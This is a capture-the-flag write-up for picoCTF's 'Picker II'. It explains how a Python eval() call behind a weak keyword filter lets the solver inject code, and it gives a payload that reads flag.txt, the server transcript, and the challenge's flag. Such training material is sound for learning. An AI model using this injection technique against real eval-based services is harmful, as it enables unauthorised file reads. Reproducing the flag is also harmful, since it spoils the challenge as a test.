# picoCTF Writeup: Picker II

**Author:** Advait Kawale  
**Event:** picoCTF  
**Difficulty:** Medium  
**Challenge Author:** LT 'syreal' Jones  
**Learning Path:** Low Level Binary Intro  
**Problem Set:** Interlude

## Problem Description
Can you figure out how this program works to get the flag?

Connect to the program with netcat:

`$ nc saturn.picoctf.net 50019`

*(Note: The URL and port may vary depending on when you launch the instance on picoCTF. Replace `saturn.picoctf.net 50019` with the connection details provided in your instance.)*

The program's source code can be downloaded [here](picker-II.py).

## Solution
Let's analyze the `picker-II.py` code. The core logic of the script resides at the bottom:

```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True

while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
...
```

The script asks for input, checks if the string `'win'` is inside it, and if it isn't, it evaluates our input by appending `()` to it. The `eval()` function in Python evaluates arbitrary string expressions.

Normally, the intended way to print the flag in this program is to call the `win` function, but the `filter()` blocks us from simply typing `win`.

Since we control the code being passed into `eval()`, we can just write our own Python code to open the `flag.txt` file and print it!

We need to craft a payload that:
1. Doesn't contain the word `win`.
2. Forms valid Python syntax when `()` is appended to it.

A simple payload is:
```python
print(open('flag.txt').read()) or exit
```

When the script appends `()` and evaluates it, the executed code becomes:
```python
eval("print(open('flag.txt').read()) or exit()")
```

This perfectly executes `print()` to print the flag to our screen, and since `print()` returns `None` (which is falsy), it then evaluates the right side of the `or` statement and calls the `exit()` function (which conveniently exists in the script) to gracefully exit!

Let's run it against the server:
```bash
$ nc saturn.picoctf.net 50019
==> print(open('flag.txt').read()) or exit
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}
```

## Flag
`picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}`
